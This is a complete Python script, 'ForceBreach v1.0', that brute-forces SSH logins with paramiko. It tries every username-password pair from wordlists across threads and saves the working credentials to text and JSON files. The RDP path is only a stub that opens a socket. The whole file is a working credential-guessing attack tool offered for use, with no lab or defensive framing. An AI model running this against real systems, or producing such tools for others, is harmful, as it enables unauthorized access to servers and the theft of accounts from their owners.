#!/usr/bin/env python3

import argparse
import logging
import sys
import time
import json
import paramiko
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import os

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('forcebreach.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class ForceBreach:
    def __init__(self, target, port, service, user_list, pass_list, threads, timeout, quiet=False):
        self.target = target
        self.port = port
        self.service = service.lower()
        self.users = self.load_file(user_list) if user_list else ['admin', 'user']
        self.passwords = self.load_file(pass_list) if pass_list else ['password', 'admin123']
        self.threads = threads
        self.timeout = timeout
        self.quiet = quiet
        self.results = []
        self.output_dir = 'forcebreach-output'
        self.output_file = os.path.join(self.output_dir, 
            f"{self.target}_{self.port}_{self.service}_{time.strftime('%Y%m%d_%H%M%S')}.txt")
        self.json_file = os.path.join(self.output_dir, 
            f"{self.target}_{self.port}_{self.service}_{time.strftime('%Y%m%d_%H%M%S')}.json")
        os.makedirs(self.output_dir, exist_ok=True)
        if quiet:
            logging.getLogger().handlers = [logging.FileHandler('forcebreach.log')]

    def load_file(self, file_path):
        """Load usernames or passwords from file."""
        try:
            with open(file_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Error reading file {file_path}: {e}")
            return []

    def test_ssh(self, user, password):
        """Test SSH credentials."""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.target, port=self.port, username=user, 
                         password=password, timeout=self.timeout)
            client.close()
            return f"SSH login successful: {user}:{password}"
        except Exception as e:
            return None

    def test_rdp(self, user, password):
        """Test RDP credentials (placeholder, requires rdp-py or similar)."""
        try:
            # Placeholder: Implement RDP brute-forcing with a library like rdp-py
            # This is a simplified check using socket for demonstration
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(self.timeout)
                sock.connect((self.target, self.port))
                # Simulate RDP credential test (not implemented)
                return None  # Replace with actual RDP library call
        except Exception as e:
            return None

    def attempt_login(self, user, password):
        """Attempt login for the specified service."""
        result = None
        if self.service == 'ssh':
            result = self.test_ssh(user, password)
        elif self.service == 'rdp':
            result = self.test_rdp(user, password)
        if result:
            self.results.append(result)
            logger.info(result)
            return {"user": user, "password": password, "status": "success", "message": result}
        return {"user": user, "password": password, "status": "failed", "message": ""}

    def run(self):
        """Run brute-force attack."""
        if self.service not in ['ssh', 'rdp']:
            logger.error(f"Service {self.service} not supported. Choose 'ssh' or 'rdp'.")
            return

        logger.info(f"Starting ForceBreach on {self.target}:{self.port}, service: {self.service}, "
                   f"threads: {self.threads}")
        json_results = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [
                executor.submit(self.attempt_login, user, password)
                for user in self.users
                for password in self.passwords
            ]
            for future in as_completed(futures):
                json_results.append(future.result())

        # Save text results
        with open(self.output_file, 'a') as f:
            for result in self.results:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {result}\n")
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Brute-force complete\n")

        # Save JSON results
        with open(self.json_file, 'w') as f:
            json.dump({
                "target": self.target,
                "port": self.port,
                "service": self.service,
                "results": json_results,
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
            }, f, indent=4)

        logger.info(f"Brute-force complete. Results saved to {self.output_file} and {self.json_file}")

def main():
    parser = argparse.ArgumentParser(
        description="ForceBreach: A brute-force tool for SSH and RDP services.",
        epilog="Example: ./forcebreach.py -t 192.168.1.100 -p 22 -s ssh -u users.txt -w passwords.txt -T 5"
    )
    parser.add_argument('-t', '--target', required=True, help="Target IP (e.g., 192.168.1.100)")
    parser.add_argument('-p', '--port', type=int, required=True, help="Target port (e.g., 22)")
    parser.add_argument('-s', '--service', required=True, choices=['ssh', 'rdp'], 
                       help="Service to brute-force (ssh or rdp)")
    parser.add_argument('-u', '--user-list', default='/usr/share/wordlists/users.txt', 
                       help="File with usernames (default: /usr/share/wordlists/users.txt)")
    parser.add_argument('-w', '--pass-list', default='/usr/share/wordlists/passwords.txt', 
                       help="File with passwords (default: /usr/share/wordlists/passwords.txt)")
    parser.add_argument('-T', '--threads', type=int, default=5, 
                       help="Number of threads (default: 5)")
    parser.add_argument('--timeout', type=float, default=5, 
                       help="Connection timeout in seconds (default: 5)")
    parser.add_argument('-q', '--quiet', action='store_true', help="Quiet mode (log to file only)")

    args = parser.parse_args()

    # Validate wordlist files
    for file_path in [args.user_list, args.pass_list]:
        if not os.path.isfile(file_path):
            logger.error(f"Wordlist file not found: {file_path}")
            sys.exit(1)

    print("""
    ==============================
         ForceBreach v1.0
      Brute-Forcing for SSH & RDP
    ==============================
    """)

    try:
        breacher = ForceBreach(
            target=args.target,
            port=args.port,
            service=args.service,
            user_list=args.user_list,
            pass_list=args.pass_list,
            threads=args.threads,
            timeout=args.timeout,
            quiet=args.quiet
        )
        breacher.run()
    except KeyboardInterrupt:
        logger.info("Brute-force interrupted by user")
        sys.exit(0)

if __name__ == "__main__":
    main()